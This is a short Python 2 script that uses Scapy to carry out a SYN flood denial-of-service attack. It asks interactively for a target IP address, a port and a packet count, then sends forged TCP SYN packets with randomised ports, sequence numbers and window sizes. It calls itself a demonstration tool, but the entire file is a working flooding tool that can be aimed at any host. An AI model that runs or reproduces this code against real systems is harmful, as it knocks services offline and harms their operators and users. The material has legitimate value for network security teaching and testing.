#!/usr/bin/python
# SynFloodAttack
# Just a tool to demonstrate the usage of a SynFlood Attack using Scapy
# By Gonzalo Murillo

from scapy.all import *
import os
import sys
import random


# A function to create a non privileged port	

def randInt():
	x = random.randint(1000,9000)
	return x	

# This is where the actual sending of the TCP/IP happens
	
def SYN_Flood(dstIP,dstPort,counter):
	total = 0
	print "Sending Packets"
	for x in range (1,counter+1):
		s_port = randInt()
		s_eq = randInt()
		w_indow = randInt()

		IP_Packet = IP ()
		IP_Packet.dst = dstIP
				
		TCP_Segment = TCP ()	
		TCP_Segment.sport = s_port
		TCP_Segment.dport = dstPort
		TCP_Segment.flags = "S"
		TCP_Segment.seq = s_eq
		TCP_Segment.window = w_indow
		TCP_Segment.ack=1000

		MY_Frame= IP_Packet/TCP_Segment/"HaX0r SVP"
		send(MY_Frame, verbose=0) # We actually send the frame		
		sys.stdout.write("\nTotal packets sent: %i\n" % x)

# Just a function to delete the screen
def clear():
 if os.name=="Windows":
	system("cls")
	
# Just a display message
def info():
	os.system("cls")
	
	print "*****************************************************************"
	print "** SynFlood, an interactive tool to simulate a SynFlood Attack **"
	print "** by Gonzalo Murillo https://github.com/GonzaloMurillo        **"
	print "*****************************************************************"
	
# Function to gather data of the target IP / target Port

def gatherData():
	dstIP = raw_input ("\nTarget IP : ")
	dstPort = raw_input ("Target Port : ")
	return dstIP,int(dstPort)

# Do this if is not loaded as a module
if __name__ == "__main__":

	clear()
	info()
	dstIP,dstPort = gatherData()
	counter = input ("How many packets do you want to send : ")
	SYN_Flood(dstIP,dstPort,int(counter))
